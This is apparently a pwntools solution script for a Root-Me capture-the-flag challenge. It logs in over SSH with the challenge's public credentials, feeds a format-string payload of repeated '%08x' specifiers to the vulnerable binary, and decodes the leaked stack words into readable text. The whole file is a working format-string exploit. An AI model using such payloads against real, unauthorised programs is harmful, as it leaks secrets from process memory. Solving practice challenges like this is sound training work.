from pwn import *
import struct

s = ssh(host='challenge02.root-me.org', user='app-systeme-ch5', password='app-systeme-ch5', port=2222)

# print 4 bytes of 32-bytes buffer
payload = "%08x " * 32
p = s.process(['/challenge/app-systeme/ch5/ch5', payload])

data = p.recvall().strip().split(' ')

log.info("Received data: {}".format(data))

decoded = []

for x in data:
    d = struct.pack("I", int(x, 16))
    decoded.append(d)

log.success("".join(decoded).strip())
